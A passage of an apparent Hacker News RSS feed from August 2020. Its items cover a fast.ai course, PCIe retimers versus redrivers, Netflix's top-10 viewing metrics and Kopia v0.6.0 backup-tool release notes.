<p>1.<strong> </strong>Optimize models to get exceptional results in computer vision, NLP, recommenders, and more</p>



<p>2. How to turn your models into web applications, and deploy them</p>



<p>3. How to enhance your models’ accuracy, speed, and reliability&nbsp;</p>



<p>4. Ethical implementation while making models</p>



<p>5. Other techniques such as random forests and gradient boosting, parameters and activations, random initialization and transfer learning, among others</p>



<p>Over the years, fast.ai has been releasing some of the best deep learning courses online for aspirants to learn for free; Last week, it released a course on ethics — <a href="https://ethics.fast.ai/videos/?lesson=1" target="_blank" rel="noreferrer noopener">Practical Data Ethics</a>.</p>



<p><strong>Note:</strong> Please do not make the <a href="https://github.com/fastai/fastbook" target="_blank" rel="noreferrer noopener">Jupyter Notebook</a> version of the book into PDF and distribute it to respect the provider’s generosity. Use it only for your education or learning if you cannot buy it on Amazon.</p>



<p><strong>Subscribe to our newsletter for free to get the most-read stories every week.</strong>&nbsp;<strong>Provide your email id below.</strong>&nbsp;<strong>We never sell your information.</strong></p>


  <!-- .wpforms-container -->                <div>
                    
                                        
        <div>

                <p><a href="https://www.analyticsdrift.com/author/analyticsdriftgmail-com/"><img alt="" src="https://secure.gravatar.com/avatar/b4013be20eaee509a78cd792d7474854?s=150&amp;r=g" srcset="https://secure.gravatar.com/avatar/b4013be20eaee509a78cd792d7474854?s=300&amp;r=g 2x" height="150" width="150" loading="lazy" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></a>
                </p>
                
        </div>

                                            </div>
                                            
                        
	<nav role="navigation" aria-label="Continue Reading">
		<h2>Continue Reading</h2>
		
	</nav>                    </div><!-- .entry-content -->
    </div>
                        </div></div>]]>
            </description>
            <link>https://www.analyticsdrift.com/a-new-free-deep-learning-course-by-fast-ai/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24279146</guid>
            <pubDate>Wed, 26 Aug 2020 04:33:24 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[PCI Express Retimers vs. Redrivers: An Eye-Popping Difference (2019)]]>
            </title>
            <description>
<![CDATA[
Score 84 | Comments 19 (<a href="https://news.ycombinator.com/item?id=24278760">thread link</a>) | @tragiclos
<br/>
August 25, 2020 | https://www.asteralabs.com/2019/06/26/pci-express-retimers-vs-redrivers-an-eye-popping-difference/ | <a href="https://web.archive.org/web/*/https://www.asteralabs.com/2019/06/26/pci-express-retimers-vs-redrivers-an-eye-popping-difference/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Retimers and redrivers have enabled longer physical channels in servers and storage systems since Peripheral Component Interface Express (PCIe) 3.0 was first introduced almost 10 years ago. Now that PCIe 4.0 is ramping up and PCIe 5.0 is just around the corner, how do these reach extension tools stack up in the face of new challenges in high-speed connectivity?</p>
<p>A redriver is a mostly analog reach extension device designed to boost the high-frequency portions of a signal to counteract the frequency-dependent attenuation caused by the interconnect: the central processing unit (CPU) package, system board, connectors and so on. A redriver’s data path typically includes a continuous time linear equalizer (CTLE), a wideband gain stage and a linear driver. In addition, redrivers often have input loss-of-signal threshold and output receiver (Rx) detection capability. Figure 1 illustrates a typical redriver block diagram.</p>
<p><a href="https://www.intel.com/content/dam/www/public/us/en/documents/white-papers/serial-bus-white-paper.pdf" target="_blank" rel="noopener noreferrer"><img src="https://www.asteralabs.com/wp-content/uploads/2020/02/red-river-block.jpg" alt="" width="731" height="419" srcset="https://www.asteralabs.com/wp-content/uploads/2020/02/red-river-block.jpg 731w, https://www.asteralabs.com/wp-content/uploads/2020/02/red-river-block-300x172.jpg 300w, https://www.asteralabs.com/wp-content/uploads/2020/02/red-river-block-260x150.jpg 260w, https://www.asteralabs.com/wp-content/uploads/2020/02/red-river-block-523x300.jpg 523w, https://www.asteralabs.com/wp-content/uploads/2020/02/red-river-block-200x115.jpg 200w, https://www.asteralabs.com/wp-content/uploads/2020/02/red-river-block-564x323.jpg 564w, https://www.asteralabs.com/wp-content/uploads/2020/02/red-river-block-600x344.jpg 600w" sizes="(max-width: 731px) 100vw, 731px"></a></p>
<p><a href="https://www.intel.com/content/dam/www/public/us/en/documents/white-papers/serial-bus-white-paper.pdf" target="_blank" rel="noopener noreferrer">Figure 1: Redriver block diagram [1]</a></p>
<p>A retimer is a mixed signal analog/digital device that is protocol-aware and has the ability to fully recover the data, extract the embedded clock and retransmit a fresh copy of the data using a clean clock. In addition to the CTLE and wideband gain stages also found in a redriver, retimers contain a clock and data recovery (CDR) circuit, a decision feedback equalizer (DFE) and a transmit (Tx) finite impulse response (FIR) driver. Finite state machines (FSMs) and/or a microcontroller typically manage the automatic adaptation of the CTLE, wideband gain, DFE and FIR driver, and implement the PCIe link training and status state machine (LTSSM). Figure 2 illustrates a typical retimer block diagram.</p>
<p><a href="https://www.intel.com/content/dam/www/public/us/en/documents/white-papers/serial-bus-white-paper.pdf" target="_blank" rel="noopener noreferrer"><img src="https://www.asteralabs.com/wp-content/uploads/2020/02/retimer-block.jpg" alt="retimer-block" width="787" height="440" srcset="https://www.asteralabs.com/wp-content/uploads/2020/02/retimer-block.jpg 787w, https://www.asteralabs.com/wp-content/uploads/2020/02/retimer-block-300x168.jpg 300w, https://www.asteralabs.com/wp-content/uploads/2020/02/retimer-block-768x429.jpg 768w, https://www.asteralabs.com/wp-content/uploads/2020/02/retimer-block-260x145.jpg 260w, https://www.asteralabs.com/wp-content/uploads/2020/02/retimer-block-537x300.jpg 537w, https://www.asteralabs.com/wp-content/uploads/2020/02/retimer-block-200x112.jpg 200w, https://www.asteralabs.com/wp-content/uploads/2020/02/retimer-block-564x315.jpg 564w, https://www.asteralabs.com/wp-content/uploads/2020/02/retimer-block-600x335.jpg 600w" sizes="(max-width: 787px) 100vw, 787px"></a></p>
<p><a href="https://www.intel.com/content/dam/www/public/us/en/documents/white-papers/serial-bus-white-paper.pdf" target="_blank" rel="noopener noreferrer">Figure 2: Retimer block diagram [1]</a></p>
<p>In simple terms, a redriver amplifies a signal, whereas a retimer retransmits a fresh copy of the signal. Figure 3 illustrates this and shows how an attenuated eye opening is boosted by a redriver and completely regenerated by a retimer.</p>
<p><img src="https://www.asteralabs.com/wp-content/uploads/2020/02/eye-attenuated-1024x238.png" alt="eye-attenuated" width="1024" height="238" srcset="https://www.asteralabs.com/wp-content/uploads/2020/02/eye-attenuated-1024x238.png 1024w, https://www.asteralabs.com/wp-content/uploads/2020/02/eye-attenuated-300x70.png 300w, https://www.asteralabs.com/wp-content/uploads/2020/02/eye-attenuated-768x178.png 768w, https://www.asteralabs.com/wp-content/uploads/2020/02/eye-attenuated-1536x357.png 1536w, https://www.asteralabs.com/wp-content/uploads/2020/02/eye-attenuated-260x60.png 260w, https://www.asteralabs.com/wp-content/uploads/2020/02/eye-attenuated-800x186.png 800w, https://www.asteralabs.com/wp-content/uploads/2020/02/eye-attenuated-200x46.png 200w, https://www.asteralabs.com/wp-content/uploads/2020/02/eye-attenuated-564x131.png 564w, https://www.asteralabs.com/wp-content/uploads/2020/02/eye-attenuated-600x139.png 600w, https://www.asteralabs.com/wp-content/uploads/2020/02/eye-attenuated.png 1658w" sizes="(max-width: 1024px) 100vw, 1024px"></p>
<p>Figure 3: Example of an eye attenuated by a channel (left), the eye after a redriver (middle) and the eye after a retimer (right)</p>
<p>The PCIe 4.0 specification took the unprecedented step of formally defining the terms “retimer,” “redriver” and the superset term “repeater,” all of which are types of extension devices or components whose purpose is to extend the physical length of a link. The definitions are:</p>
<ul>
<li><strong>Repeater</strong>: An imprecise term for an extension device [2]. (This term causes confusion … please don’t use it!)</li>
<li><strong>Redriver</strong>: A non-protocol-aware software-transparent extension device [2].</li>
<li><strong>Retimer</strong>: A physical layer protocol-aware, software-transparent extension device that forms two separate electrical link segments [2].</li>
</ul>
<h3>Use Cases for Retimers and Redrivers</h3>
<p>Reach extension devices are necessary whenever the channel – the electrical path between the root complex (RC) and endpoint (EP) – is longer than the PCIe specification allows. The specification defines the maximum channel length in terms of insertion loss at the Nyquist frequency (an informative specification, but easy to validate) and in terms of a reference receiver’s ability to sufficiently equalize and recover the data assuming a worst-case link partner transmitter (a normative specification, but time-consuming to validate).</p>
<p>Suffice it to say, at PCIe 4.0 speeds, reach extension devices are necessary for:</p>
<ul>
<li>Multiconnector topologies.</li>
<li>Cabled topologies.</li>
<li>Single-connector add-in card (AIC) topologies with baseboard channels longer than 9.5 inches.</li>
</ul>
<p>Figure 4 shows an example of a two-connector “riser card” topology, which ordinarily would exceed the PCIe 4.0 loss budget of 28 dB. A redriver or retimer will enable reliable, error-free communication between the RC and EP. But how do you choose which one is the right tool for the job? Well, it helps to know more about the fundamental differences in their capabilities.</p>
<p><img src="https://www.asteralabs.com/wp-content/uploads/2020/02/redriver-1024x391.png" alt="redriver" width="1024" height="391" srcset="https://www.asteralabs.com/wp-content/uploads/2020/02/redriver-1024x391.png 1024w, https://www.asteralabs.com/wp-content/uploads/2020/02/redriver-300x115.png 300w, https://www.asteralabs.com/wp-content/uploads/2020/02/redriver-768x293.png 768w, https://www.asteralabs.com/wp-content/uploads/2020/02/redriver-260x99.png 260w, https://www.asteralabs.com/wp-content/uploads/2020/02/redriver-785x300.png 785w, https://www.asteralabs.com/wp-content/uploads/2020/02/redriver-200x76.png 200w, https://www.asteralabs.com/wp-content/uploads/2020/02/redriver-564x216.png 564w, https://www.asteralabs.com/wp-content/uploads/2020/02/redriver-600x229.png 600w, https://www.asteralabs.com/wp-content/uploads/2020/02/redriver.png 1120w" sizes="(max-width: 1024px) 100vw, 1024px"><br>
Figure 4: Example of redriver (top) and retimer (bottom) used in a two-connector topology</p>
<h3>Comparing Retimer and Redriver Capabilities</h3>
<p>Not all redrivers and retimers are the same. There are many distinctions between the two, which are universally true for all PCIe reach extension devices. For example:</p>
<p><strong>Retimers actively participate in the PCIe protocol; redrivers do not.</strong> The PCIe base specification spells out how and to what extent retimers participate in the protocol during Detect, Recovery, L0 and other LTSSM states. Equalization to the L0 and L1 link states requires value-added functionality from the retimer (handshakes, timeouts, bit manipulation, etc.). Redrivers are unaware of and unparticipating in the protocol. If the link works reliably the first time, that’s great! But if the link experiences marginality of any sort, it becomes exceedingly difficult to pinpoint whether the problem is physically before the redriver or after it, since the redriver’s role in link formation is undefined and unknown to its link partners.</p>
<p><strong>Retimers reset the jitter and insertion loss budgets; redrivers do not.</strong> A retimer’s CDR fully recovers the data stream and retransmits it on a clean clock. Starting with a fresh copy of the data enables the extension of the channel to twice the original specification. Without a CDR, the best a redriver can do is attenuate (not reset) the data-dependent jitter (DDJ) caused by intersymbol interference (ISI). A redriver cannot attenuate uncorrelated or random jitter (RJ). In fact, a redriver will always add to RJ due to its own device thermal noise in a root-mean-square (RMS) manner <a href="https://www.intel.com/content/dam/www/public/us/en/documents/white-papers/serial-bus-white-paper.pdf" target="_blank" rel="noopener noreferrer">[1]</a>.</p>
<p><strong>Retimers have a DFE; redrivers do not.</strong> A DFE compensates for reflections in the channel response caused by impedance discontinuities in board vias, connectors and package socket-board interfaces. The nice thing about a DFE is that it is unaffected by crosstalk. The DFE equalizes just as well in the presence of crosstalk, and once the data is sampled by the retimer’s CDR, crosstalk is eliminated for good. Redrivers use a CTLE that boosts both the signal and the noise <a href="https://www.intel.com/content/dam/www/public/us/en/documents/white-papers/serial-bus-white-paper.pdf" target="_blank" rel="noopener noreferrer">[1]</a>. Crosstalk is not eliminated or even attenuated through a redriver; in fact, it gets amplified.</p>
<p><strong>Retimers automatically adapt their receive and transmit equalizers to match the characteristics of the channel and the link partner’s needs; redrivers do not.</strong> A retimer will examine the signal it receives and adjust the CTLE and DFE to minimize its own bit error rate (BER). Likewise, the retimer’s transmitter will adjust its de-emphasis and pre-shoot equalization to minimize the link partner’s BER according to PCIe equalization protocol. A redriver, conversely, operates with a static equalizer setting. The optimal setting (which can be different for every channel in the system) is often painstakingly selected following an exhaustive search in Input/Output Buffer Information Specification (IBIS) algorithmic modeling interface (AMI) simulations and again in lab testing – a process fondly referred to as “tuning.”</p>
<p><strong>Retimers have built-in features to help diagnose link issues (both electrical and protocol); redrivers do not.</strong> Retimers have tools for assessing the electrical performance (internal eye monitors, pattern generators, pattern checkers) and protocol performance (link state history monitors, timeout adjustments). Redrivers cannot offer such diagnostic features because they are neither protocol-aware nor aware of the actual data passing through. Redrivers do not know what state the link is in.</p>
<p><strong>Retimers correct for lane-to-lane skew; redrivers do not.</strong> PCIe has a tight requirement on the physical skew between lanes on a board (1.6 ns for PCIe 4.0), typically caused by mismatches in channel routing length [3]. Retimers are required to compensate and reset any lane-to-lane skew, effectively doubling the specification budget. Redrivers cannot compensate for lane-to-lane skew, and what’s worse is that they may degrade the skew depending on how symmetric the redriver package is across all lanes.</p>
<p><strong>Retimers can be placed anywhere between two PCIe-compliant channels; redrivers cannot.</strong> By definition, retimers extend the total PCIe channel reach by two times the specification. A redriver’s reach extension, however, depends on where it is placed in the channel – how much loss is before the redriver versus how much is after <a href="https://www.intel.com/content/dam/www/public/us/en/documents/white-papers/serial-bus-white-paper.pdf" target="_blank" rel="noopener noreferrer">[1]</a>. The specific placement of a redriver must be carefully determined by IBIS-AMI simulation and experimentation. Too close to the root complex transmitter, and the redriver’s CTLE will enter nonlinear operation and will have limited benefit. Placed too far from the transmitter, the redriver’s device noise may significantly degrade the signal-to-noise ratio (SNR) of the data signal.</p>
<p>It’s not all bad news for redrivers. They do have lower power consumption and lower input-to-output latency compared to retimers. But if the link does not form in the first place or if the BER is too high, none of that matters!</p>
<p><img src="https://www.asteralabs.com/wp-content/uploads/2020/02/comparision.png" alt="comparision" width="809" height="527" srcset="https://www.asteralabs.com/wp-content/uploads/2020/02/comparision.png 809w, https://www.asteralabs.com/wp-content/uploads/2020/02/comparision-300x195.png 300w, https://www.asteralabs.com/wp-content/uploads/2020/02/comparision-768x500.png 768w, https://www.asteralabs.com/wp-content/uploads/2020/02/comparision-230x150.png 230w, https://www.asteralabs.com/wp-content/uploads/2020/02/comparision-461x300.png 461w, https://www.asteralabs.com/wp-content/uploads/2020/02/comparision-200x130.png 200w, https://www.asteralabs.com/wp-content/uploads/2020/02/comparision-564x367.png 564w, https://www.asteralabs.com/wp-content/uploads/2020/02/comparision-600x391.png 600w" sizes="(max-width: 809px) 100vw, 809px"></p>
<p>Table 1: Comparison of retimer and redriver capabilities and usage</p>
<h3>Outlook for PCIe 4.0 Systems</h3>
<p>Looking ahead to the upcoming PCIe 4.0 systems, all signs are pointing to an increased need for reach extension devices – and retimers in particular – due to several trends and challenges:</p>
<ul>
<li>CPUs have more PCIe lanes per socket (&gt;100 in some cases [4]) compared to PCIe 3.0. This leads to a greater number of PCIe slots and riser cards, denser routing, and an increased use of multiconnector topologies.</li>
<li>PCIe is shifting from an I/O bus to a multipurpose system interconnect. This means that more servers will be designed to be modular, allowing an array of compute, storage and networking resources to plug in to an increasing number of PCIe slots. This type of open, “plug anything in and it will work” server architecture requires a reach extension solution that is PCIe compliant with plug-and-play interoperability.</li>
<li>The disaggregation of resources such as modular servers, storage trays and accelerator trays is pushing endpoints physically away from CPUs, requiring cables or carrier cards to connect everything together. These longer physical topologies will increasingly need reach …</li></ul></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.asteralabs.com/2019/06/26/pci-express-retimers-vs-redrivers-an-eye-popping-difference/">https://www.asteralabs.com/2019/06/26/pci-express-retimers-vs-redrivers-an-eye-popping-difference/</a></em></p>]]>
            </description>
            <link>https://www.asteralabs.com/2019/06/26/pci-express-retimers-vs-redrivers-an-eye-popping-difference/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24278760</guid>
            <pubDate>Wed, 26 Aug 2020 03:20:11 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Cover BLM protestor faces with a black fist]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24278757">thread link</a>) | @aliabd
<br/>
August 25, 2020 | https://www.gradio.app/hub/hub-blm | <a href="https://web.archive.org/web/*/https://www.gradio.app/hub/hub-blm">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.gradio.app/hub/hub-blm</link>
            <guid isPermaLink="false">hacker-news-small-sites-24278757</guid>
            <pubDate>Wed, 26 Aug 2020 03:19:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Netflix's Top List Should Be Taken with a Large Grain of Salt]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24278727">thread link</a>) | @ponderingfish
<br/>
August 25, 2020 | https://ottverse.com/netflix-top-10-movies-list-should-be-taken-with-a-huge-grain-of-salt/ | <a href="https://web.archive.org/web/*/https://ottverse.com/netflix-top-10-movies-list-should-be-taken-with-a-huge-grain-of-salt/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>As you might have already seen on the Twitter-verse and in <a href="https://www.bloomberg.com/news/articles/2020-07-15/netflix-most-popular-original-movies">Bloomberg</a>, Netflix released its top 10 movies and Extraction topped that list. The numbers in the data represent the number of views that a movie has gathered in the first 4 weeks of its release.</p><p><img src="https://ottverse.com/images/netflix-top-10-movies.png" alt="Top 10 list from Netflix"></p><p>Looks great, right? 99M viewers for Extraction - that’s a huge win for Netflix.</p><p><img src="https://ottverse.com/images/the-extraction-randeep-hooda-chris-hemsworth.png" alt="Extraction from Netflix"></p><p>But, wait. Can we trust these numbers right off the bat?</p><h2 id="netflixs-data-and-reporting-methodologies">Netflix’s Data and Reporting Methodologies</h2><p>The problem with Netflix is that they guard their data religiously and have never released their data in its entirety to the public. So, if they tell you that a movie was watched 100M times in Japan, you just have to take their word for it and break out a bottle of champagne if you were the producer or actor in that film.</p><p>When Netflix’s data says that “Extraction” starring “Thor” Chris Hemsworth and Bollywood star Randeep Hooda garnered 99 million views within the first 4 weeks of its release, does it mean that the movie was truly exceptional and beat every other release on Netflix in terms of audience numbers?</p><p>Well, to be honest, I really can’t say because Netflix’s data is opaque, their methodology is unknown, and their definition of a movie’s popularity using only their “starters” metric is odd to say the least.</p><p>Let me explain why.</p><h2 id="how-does-netflix-quantify-their-audience">How does Netflix Quantify Their Audience</h2><p>The first step in decoding the data that Netflix released is understanding the definitions of their metrics.</p><p>Here is what Netflix shared with the <a href="http://data.parliament.uk/writtenevidence/committeeevidence.svc/evidencedocument/communications-committee/public-service-broadcasting-in-the-age-of-video-on-demand/written/104558.html">United Kingdom’s House of Lords’ Communications Committee</a>:</p><blockquote><p>The information we give them mainly consists of “starters” (i.e. households that watch two minutes of a film or one episode) and “completers” (i.e. households that watch 90% of a film or season of a series) for the first seven and 28 days on Netflix. We believe that these two metrics will give our creative partners a broader understanding of how members engage with their title from start to finish. We also selectively share “watchers” (i.e. households that watch 70% of a film or single episode of a series) with both the public and with creators. Depending on how useful our partners find this data, we will consider sharing it in more countries outside Europe and North America.</p></blockquote><p>Distilling this into the main classifications, we get:-</p><ul><li><strong>starters</strong>: households that watch two minutes of a film or one episode</li><li><strong>watchers</strong>: households that watch 70% of a film or single episode of a series</li><li><strong>completers</strong>: households that watch 90% of a film or season of a series</li></ul><p>Only 2 mins? Which 2 minutes - from the beginning, in the middle, or from the point they left off the previous day?</p><p>In the <a href="https://s22.q4cdn.com/959853165/files/doc_financials/2019/q4/FINAL-Q4-19-Shareholder-Letter.pdf">Q4 2019 letter shared by Netflix to its shareholders</a>, Netflix reveals their definition of a view and its impact on its data reports. I’ve copy-pasted the relevant section here and highlighted the important parts.</p><blockquote><p>As we’ve expanded our original content, we’ve been working on how to best share content highlights that demonstrate popularity. <strong>Given that we now have titles with widely varying lengths - from short episodes (e.g. ​Special​ at around 15 minutes) to long films (e.g. ​The Highwaymen​ at 132 minutes), we believe that reporting households viewing a title based on 70% of a single episode of a series or of an entire film, which we have been doing, makes less sense.</strong> We are now reporting on households (accounts) that chose to watch a given title . Our new methodology is similar to the BBC iPlayer in their rankings​ based on “requests” for the title, “most popular” articles on the New York Times which include those who opened the articles, and YouTube view counts. <strong>This way, short and long titles are treated equally, leveling the playing field for all types of our content including interactive content, which has no fixed length. The new metric is about 35% higher on average than the prior metric.</strong> For example, 45m member households chose to watch ​Our Planet​ under the new metric vs. 33m under the prior metric.</p></blockquote><p>Buried in a footnote on the same page in the <a href="https://s22.q4cdn.com/959853165/files/doc_financials/2019/q4/FINAL-Q4-19-Shareholder-Letter.pdf">Q4 2019 shareholder letter</a> is an explanation of what “chose to watch a given title” means -</p><blockquote><p>Chose to watch and did watch for at least 2 minutes – long enough to indicate the choice was intentional – is the precise definition</p></blockquote><p>Netflix says that this method of reporting is similar to what the BBC and YouTube do, and so, they aren’t doing anything funny here.</p><p>Well, summarizing everything till now, it appears that Netflix counts how many sessions lasted at least 2 minutes and this metric is used to quantify their audience.</p><h2 id="the-issue-with-reporting-based-on-starters">The Issue with Reporting Based on “starters”</h2><p>Portraying a movie’s popularity based solely on “starters” is where things begin to get weird for me.</p><p>Having spent a few years in the video analytics industry, I can say with absolute confidence that a large number of views does not * <strong>always</strong> * translate to popularity. There are caveats one has to consider and some amount of data cleansing and outlier removal is needed before drawing broad conclusions.</p><p>When I look at such viewership statistics, a few questions come to mind immediately.</p><ul><li>How long was each view (beyond the 2 minute minimum i.e.)?</li><li>When did each view begin and end (i.e., start and end times)?</li><li>How many views or sessions did a person take to completely watch a movie?</li></ul><p>Note: “completely” generally means 90% of the playtime of a movie and this is considered as an acceptable threshold in the industry because people generally skip the credits.</p><p>Now, let’s understand with the help of a few examples of why these questions are important in making sense of an audience’s engagement.</p><h3 id="problem-1-if-a-person-watches-only-2-minutes-that-should-not-count-towards-the-movies-popularity">Problem 1: if a person watches only 2 minutes, that should not count towards the movie’s popularity.</h3><p><strong>Example 1:</strong> if a person began to watch Extraction, watched it for 2 mins, found it utterly boring, and decided to bail on it after just 3 minutes, then do you count it as a view or a starter? Well, logically speaking - he did start the movie, but, when you take this number without context (the viewer dropped out after 3 minutes) and use it to justify a movie’s “popularity”, it’s not right.</p><p><strong>Example 2:</strong> Let’s assume that Netflix acquires the “Oceans” franchise and decides to produce the “Oceans 21” with 21 A-Listers from Hollywood. And by a cruel twist-of-fate, they produce a movie with the worst possible storyline and direction. However, what they do get right is marketing! Netflix pulls out all the stops and does a brilliant job at marketing the movie and building up excitement for Oceans 21.</p><p>On the day of release, Oceans 21 gets millions of hits because people are excited to see George Clooney and Brad Pitt crush it! But, what’s happening?</p><ul><li>10 minutes into the movie, most of the viewers realize that the movie sucks and stop watching. But, they are added to the movie’s popularity count because they watched 2 mins, right?</li><li>a section of Netflix’s subscribers who haven’t (yet) heard that the movie sucks end up watching at least 10 mins of the movie before bleeding out of their eyes. But, they too are added to the “watch” count because they watched 2 mins, right?</li><li>and, the die-hard fans of the Oceans’ franchise will watch it no matter what the critics say and of course, they are going to be added to the “watch” count.</li></ul><h3 id="problem-2-multiple-viewing-sessions-from-the-same-subscriber-arent-considered">Problem 2: Multiple Viewing Sessions from the Same Subscriber Aren’t Considered</h3><p>The definition of “starter” also does not take consider multiple viewing sessions and this is an issue. Let’s take a simple example to understand more.</p><p><strong>Case A:</strong> I might have watched a single movie over a period of 10 days watching 10-15 mins each day, because I need to split my day between work, babysitting my toddlers, yard-work, etc.</p><p><strong>Case B:</strong> Now consider another situation where I had the entire Saturday night to myself and watched an entire 1.5 hour movie in one sitting.</p><p>So, is A more popular than B? It will under Netflix’s algorithm because A had 10 “starters” and B had only one.</p><p>Sounds wrong, doesn’t it? Okay, now let’s look at the problem from a different angle.</p><h2 id="does-netflixs-data-translate-to-imdb-and-rotten-tomato-ratings">Does Netflix’s data Translate to IMDB and Rotten Tomato ratings?</h2><p>Take a look at the IMDB and Rotten Tomato ratings for Netflix’s Top 10 list because these ratings play a huge role in a movie’s continued - importantly, after the marketing hype has died down.</p><p>We compiled the IMDB and Rotten Tomato ratings (as of July 16th 2020 at 6 am UTC) and here is what the data shows.</p><p><img src="https://ottverse.com/images/netflix-top10-imdb-rottentomato.png" alt=""></p><p>At first glance, you might think that IMDB appears to agree with Netflix’s popularity chart, but, The Irishman throws a curveball coming in at 7.9 in IMDB and 96% in Rotten Tomato while languishing at #6 in Netflix. The same goes for The Platform which has great ratings from both IMDB and Rotten Tomato, but is at the 9th position in Netflix’s data.</p><p>Let’s look at this data in a different perspective.</p><p><img src="https://ottverse.com/images/ranking-of-movies-netflix-imdb-rottentomato.png" alt=""></p><p>Below is a table where we have ranked the movie based on the audience’s ratings/reviews on IMDB and Rotten Tomato. We have highlighted three movies in particular - Extraction, The Irishman, The Platform to show how different they are ranked based on the data from Netflix, IMDB, and Rotten Tomato.</p><p>Quit different, eh?</p><p>The Platform’s ranking goes to show that a movie might not have the same number of views as more “popular” movies, but, can be highly rated by the audience. So, does Netflix’s methodology have flaws?</p><h2 id="what-data-from-netflix-will-help">What Data from Netflix Will Help?</h2><ul><li><strong>Viewing Trends for 4 weeks:</strong> Instead of providing a single, aggregated number, it will be great if a trendline of the number of “watch"s is released.
This will help us understand the influence of the first few days of release on the overall aggregated figure and how a movie fares after the initial hype has died down.</li><li><strong>Number of Sessions Required to achieve a “Complete” Watch:</strong> How many sessions does the average user take to watch a movie completely? If the average viewer take 3 attempts to watch a movie fully, and if the movie has 30 million views, it probably is safe to assume that the movie wasn’t watched fully 30 million times. Right?</li><li><strong>Session Durations as a function of the length of the Content:</strong> preferably represented as a histogram.</li><li><strong>Internal Ratings:</strong> Can Netflix tell …</li></ul></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://ottverse.com/netflix-top-10-movies-list-should-be-taken-with-a-huge-grain-of-salt/">https://ottverse.com/netflix-top-10-movies-list-should-be-taken-with-a-huge-grain-of-salt/</a></em></p>]]>
            </description>
            <link>https://ottverse.com/netflix-top-10-movies-list-should-be-taken-with-a-huge-grain-of-salt/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24278727</guid>
            <pubDate>Wed, 26 Aug 2020 03:14:25 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Kopia v0.6.0]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24278622">thread link</a>) | @hrez
<br/>
August 25, 2020 | https://kopia.io/docs/release-notes/v0.6.0/ | <a href="https://web.archive.org/web/*/https://kopia.io/docs/release-notes/v0.6.0/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
	
	
	<p>We are very excited to announce the 0.6 release of Kopia! This is a big milestone on the way to an upcoming 1.0 release and there have not only been a large number of changes across the stack but also growth of the community.</p>
<p>This version brings manny performance, usability and stability improvements listed below, adds supports for new providers and CLI options and introduces major new features described below:</p>
<ul>
<li><a href="https://kopia.io/docs/maintenance/">Maintenance Tasks</a></li>
<li><a href="https://kopia.io/docs/repository-server/">Repository Server</a></li>
<li><a href="https://kopia.io/docs/repository-synchronization/">Repository Synchronization</a></li>
</ul>
<h3 id="upgrade-notes">Upgrade notes</h3>
<ul>
<li>Upgrading from 0.5.x is supported and should be automatic</li>
<li>Upgrading from 0.4.0 or earlier is not officially supported, it may work but use at your own risk. It’s strongly recommended to create new repository using v0.6.0 and migrate existing snapshots as outlined in the documentation. After v0.6.0 the deprecated encryption and hashing schemes from v0.4.0 will be removed.</li>
</ul>
<h3 id="key-changes">Key Changes</h3>
<h4 id="core">Core</h4>
<ul>
<li>big performance improvements when snapshotting large directories <a href="https://github.com/kopia/kopia/pull/331">#331</a></li>
<li>improvements for dealing with eventually-consistent stores (S3) <a href="https://github.com/kopia/kopia/pull/437">#437</a></li>
<li>GC safety improvements to resolve race condition when content is re-referenced when about to be deleted <a href="https://github.com/kopia/kopia/pull/420">#420</a></li>
<li>added OpenCensus <a href="https://github.com/kopia/kopia/pull/339">#339</a></li>
<li>introduced explicit maintenance operations that perform periodic repository cleanup/compaction <a href="https://github.com/kopia/kopia/pull/411">#411</a></li>
<li>disabled automatic compaction on repository opening - moved to maintenance tasks</li>
<li>added AsyncWrites to ObjectWriter, which improves performance… <a href="https://github.com/kopia/kopia/pull/369">#369</a></li>
<li>object: ensure that all I objects have a content prefix which improves locality by putting them in q packs</li>
<li>deduplicate multiple policies for the same source in policy manager, fixes #391</li>
<li>fixed race condition during Open() where we may read incomplete file</li>
<li>deprecated NONE algorithm, will not be available for new repositories <a href="https://github.com/kopia/kopia/pull/395">#395</a></li>
<li>server: automatically flush the repository after setting or deleting a policy <a href="https://github.com/kopia/kopia/pull/489">#489</a></li>
<li>snapshot checkpointing <a href="https://github.com/kopia/kopia/pull/410">#410</a></li>
<li>moved creating cache directory from connect to first use <a href="https://github.com/kopia/kopia/pull/450">#450</a></li>
<li>persist relative path to cache if possible, this allows config directory to be partially portable</li>
<li>server: implemented ‘flush’ and ‘refresh’ API</li>
<li>experimental support for remote repository <a href="https://github.com/kopia/kopia/pull/427">#427</a></li>
<li>repo: refactored public API <a href="https://github.com/kopia/kopia/pull/318">#318</a></li>
</ul>
<h4 id="kopiaui">KopiaUI</h4>
<ul>
<li>support for multiple repositories + portability <a href="https://github.com/kopia/kopia/pull/398">#398</a></li>
<li>highlight snapshot errors <a href="https://github.com/kopia/kopia/pull/376">#376</a></li>
</ul>
<h4 id="providers">Providers</h4>
<ul>
<li>support for gather writes <a href="https://github.com/kopia/kopia/pull/373">#373</a></li>
<li>b2: added provider for backblaze b2</li>
<li>sftp: add missing options for configuring sftp known_hosts</li>
<li>s3: add CLI option for disabling tls verification while connecting to s3</li>
<li>filesystem: added retry which addresses the macOS race condition</li>
</ul>
<h4 id="cli-improvements">CLI Improvements</h4>
<ul>
<li>added flags to control progress output</li>
